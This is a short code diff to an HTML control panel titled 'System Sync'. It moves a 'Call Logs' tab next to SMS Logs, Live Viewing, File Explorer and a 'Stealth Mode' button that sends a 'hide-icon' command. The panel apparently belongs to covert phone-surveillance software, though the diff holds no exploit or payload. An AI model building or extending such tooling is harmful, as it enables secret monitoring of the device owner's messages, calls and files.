@@ -49,7 +49,7 @@
     </style>
 </head>
 <body>
-<div class="nav-item" onclick="showTab('calls')"><i class="fa fa-phone"></i> Call Logs</div>
+
 
 <div id="tab-calls" style="display:none">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
@@ -85,6 +85,7 @@
         <div class="sidebar-header">System Sync</div>
         <div class="nav-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
         <div class="nav-item" onclick="showTab('sms')"><i class="fa fa-envelope"></i> SMS Logs</div>
+        <div class="nav-item" onclick="showTab('calls')"><i class="fa fa-phone"></i> Call Logs</div>
         <div class="nav-item" onclick="showTab('live')"><i class="fa fa-video"></i> Live Viewing</div>
         <div class="nav-item" onclick="showTab('explorer')"><i class="fa fa-folder-open"></i> File Explorer</div>
         <div class="nav-item" onclick="sendCmd('hide-icon')" style="color:#f39c12; margin-top: auto;"><i class="fa fa-eye-slash"></i> Stealth Mode</div>
@@ -211,5 +212,6 @@ socket.on('battery-update', (v) => {
     </script>
 </body>
 </html>
+
 
 
